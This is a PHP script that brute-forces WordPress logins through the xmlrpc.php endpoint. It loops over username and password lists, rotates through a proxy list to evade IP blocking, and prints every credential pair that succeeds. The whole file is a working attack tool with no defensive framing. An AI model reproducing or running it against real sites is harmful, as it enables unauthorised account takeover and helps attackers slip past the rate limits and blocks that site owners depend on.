<?php
require 'vendor/autoload.php';

$domain = 'http://example.com';
$endpoint = $domain . "/xmlrpc.php";

$users_file = 'users.txt';
$passwords_file = 'passwords.txt';
$proxys_file = 'proxys.txt';

$users = file($users_file);
$passwords = file($passwords_file);
$proxys = file($proxys_file);

echo "\nUsers file: $users_file\nPasswords file: $passwords_file\nTarget: $endpoint\n\n";

function is_not_login_error($e) {
  if ( strpos($e->getMessage(), 'Usuario') !== false && strpos($e->getMessage(), 'incorrecta') !== false )
    return false;

  if ( strpos($e->getMessage(), 'Nome') !== false && strpos($e->getMessage(), 'senha') !== false )
    return false;

  return true;
}

$i = 0;
foreach ( $users as $user ) {
  foreach ( $passwords as $pass ) {
    $pass = trim($pass);
    $user = trim($user);
    # Create client instance
    $wpClient = new \HieuLe\WordpressXmlrpcClient\WordpressClient($endpoint, $user, $pass);

    $p = $i % count($proxys);
    $i++;
    $proxy = explode(':',trim($proxys[$p]));
    $proxy = array('proxy_ip'=>$proxy[0], 'proxy_port'=>$proxy[1]);
    $wpClient->setProxy($proxy);

    try {
      $a = $wpClient->getProfile();

      echo "El password de '$user' es '$pass'\n";

    } catch ( Exception $e ) {
      if ( is_not_login_error($e) ) {
        echo "\n" . $e->getMessage() . "\n\n";
      } else {
        echo '.';
      }
    }
  }
}
